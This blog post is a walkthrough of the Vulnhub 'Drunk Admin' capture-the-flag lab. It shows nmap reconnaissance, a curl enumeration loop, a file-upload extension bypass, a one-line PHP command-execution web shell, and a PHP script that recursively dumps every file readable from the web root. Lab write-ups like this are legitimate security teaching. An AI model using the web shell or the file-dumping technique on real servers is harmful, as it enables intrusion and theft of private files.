---
layout: blog
title: Drunk Admin challenge
date:   2017-03-07 19:30:00 +0100
categories: itsec
comments: true
---

## Intro
This walkthrough is about the [Drunk Admin](https://www.vulnhub.com/entry/drunk-admin-web-hacking-challenge-1,14/) challenge, I've found on [Vulnhub](https://www.vulnhub.com/). Just download the zip file, and create a VirtualBox machine from it, and you are ready to go.

## Recon
You can just log in to the console of the virtual machine with the credentials root:toor to find out the ip, or run the command `nmap -sP 192.168.58.1/24` for a ping sweep. Just make sure to use your own ip range. In my case, the host is 192.168.58.101, so I will use this address later.
Let's check the open ports of the machine, to find out possible vulnerable services, with `sudo nmap -A -O -p 1-65535 192.168.58.101`. The result is the following:
```
Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-06 23:11 CET
Nmap scan report for 192.168.58.101
Host is up (0.00063s latency).
Not shown: 64998 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
| ssh-hostkey: 
|   1024 57:a2:04:3d:6e:e5:01:7b:b4:c6:e5:f9:76:25:8a:8a (DSA)
|_  2048 66:9a:ee:a2:2a:1a:59:47:b9:c5:50:da:a6:96:76:16 (RSA)
8880/tcp open  http    Apache httpd 2.2.16 ((Debian))
|_http-server-header: Apache/2.2.16 (Debian)
|_http-title: Tripios
MAC Address: 08:00:27:06:12:7C (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.26 - 2.6.35, Linux 2.6.32
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms 192.168.58.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.06 seconds
```
Great, this means we have a running apache on port 8880, let's check it in a browser. It should look like this:
![Drunk Admin home page]({{ site.url }}/assets/images/drunk-admin-1.png)

## Explore the website
If you click on the PHP link on the bottom of the page, it leads to http://192.168.58.101:8880/myphp.php?id=102 . This is very suspicios, it seems like the id parameter can be tricked. There is a small shell script to scrape all the results in the range of 1 to 200, excluding the ones, which are protected by the php script, saying "Try harder".
[enummyphp.sh](https://github.com/misnyo/vulnhub-codes/blob/master/drunk-admin/enummyphp.sh)
```bash
#!/bin/bash
for N in {1..200}
do
    echo $N
    curl "http://192.168.58.101:8880/myphp.php?id=$N" > tmp
    if ! grep -q "Try harder" "tmp"; then
        cp tmp "$N.html"
        echo "http://192.168.58.101:8880/myphp.php?id=$N"
    fi
done
```
The results of the following script are:
* 101.html
* 102.html
* 104.html
* 108.html
* 116.html
* 132.html
* 164.html
* 99.html

All are phpinfo results, 99 is the full one, and 132 is the $\_SERVER variables. However, it is not a real exploit, so let's try to dig deeper. However, this information can be useful in the future.

## Exploit the website

Going through the website, the low hanging fruit is upload.php, which uploads a user specified picture, and provides a link for it, which looks like some hash, plus the extension. So the image upload works fine, as designed, but what happens, if I try to upload a php file? It seems like there is a restriction about file extensions, which is a great security feature, but does it work as designed?

Let's try to upload a file named sample.php.jpg. It doesn't display an error, however it doesn't display and image as well. After some digging in the request/response data, there is a suspicios cookie, named trypios, which contains a hash. What if I try to access this file in a way how images are stored, but with the hash plus php extesion? It actually works, and displays the result of the `phpinfo();` function. This vulnerability by [OWASP](https://www.owasp.org/) is specified as [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). Let's see what we can do with this.

My first guess was to try to get a [Command Injection](https://www.owasp.org/index.php/Command_Injection), by uploading a vulnerable php script, which enables a user to execute any command under the web server's user privileges. It looks like this:

```php
<?php
exec($_GET['cmd']);
?>
```

Which results in a "Oh, you are naughty" message. After further investigation, my guess was that the upload script somehow verifies the content of the uploaded file, and disallows either the php function call exec, or the access of the variable $\_GET. But this doesn't stop me to enumerate the whole content of the webserver's root directory!

## Can I haz all the files?

So I created a simple php script to go through the whole content of the webserver, and print it. For the first try, it gave me some garbage, obviously the binary content of the uploaded images were present, so I had to exclude those. But what exclusion rule would be better, than the drunk admin's own?:)

[dirlist.jpg.php](https://github.com/misnyo/vulnhub-codes/blob/master/drunk-admin/dirlist.jpg.php)
```php
<?php 
function sd($dir){
	$dc = scandir($dir);
	foreach($dc as $f){
		if($f == "." || $f == ".." || preg_match("/^.*\.(bmp|jpeg|gif|png|jpg).*$/i", $f)) continue;
		$f = $dir."/".$f;
		print $dir.$f."\n";
		if(is_dir($f)){
			print "dir";
			sd($f);
		}elseif(is_file($f)){
			print("<h3>$f</h3>");
			print_r(file_get_contents($f));
		}
    }
}
sd("../");
?>
```
Let's see what we got! There is a file, which is not accessible by the public, it has been disabled by an .htaccess configuration rule, which is a great practice, but php can read it regardless, and this is our next step. The filename is .proof, and the content is:

```
# Drunk Admin Challenge #
#     by @anestisb  #
#########################

bob> Great work.
bob> Meet me there.
...> ?
bob> What? You don't know where?
bob> Work a little more your post
     exploitation skills.

Secret Code:
TGglMUxecjJDSDclN1Ej

Mail me your methods at:
anestis@bechtsoudis.com
```
Gotcha. At least we know the message, but not the place. What is this secret code for? Let's try to dig deeper.

## Solution
As we have seen previously, the [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html) is enabled, which allows users to share their content on the webserver, by creating a directory named public_html in their home directory. What if I'm very greedy, and try to get all the contents of the home directories in the system, by using the php script I used to enumerate the root of the webserver?

So it seems, there is a user called bob, who uses this feature of [Apache](https://httpd.apache.org/). And in the folder /home/bob/public_html, we can find some very interesting content. After trying to input the secret from the previous message to http://192.168.58.101/~bob/, and receiving some garbage, I went through the contents of other php files, eg. encrypt.php. So it seems like bob uses [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) to hide his secret from us. But this code doesn't return any useful answer, and after checking the actual index.php script, the cipher looks like some base64 encoded string. Decoding the secret with base64, and posting to index.php reveals the last information for the secret meeting:
```
Alice, prepare for a kinky night. Meet me at '35.517286' '24.017637'
```
It's time to travel to Crete!
